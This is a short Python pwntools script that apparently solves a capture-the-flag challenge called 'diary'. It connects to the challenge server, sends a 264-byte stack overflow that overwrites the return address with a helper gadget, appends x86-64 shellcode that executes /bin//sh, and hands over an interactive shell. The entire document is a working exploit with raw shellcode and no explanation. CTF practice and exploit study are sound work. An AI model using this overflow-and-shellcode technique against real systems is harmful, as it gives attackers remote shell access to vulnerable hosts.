from pwn import *

context.binary = exe = ELF('./diary')

io = remote('challs.tfcctf.com', 31627)
# io = process()
# gdb.attach(io, api=True)

io.recvuntil(b'...\n')
payload = b'i'*264 + p64(exe.sym['helper']+4) + b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
io.sendline(payload)
io.interactive()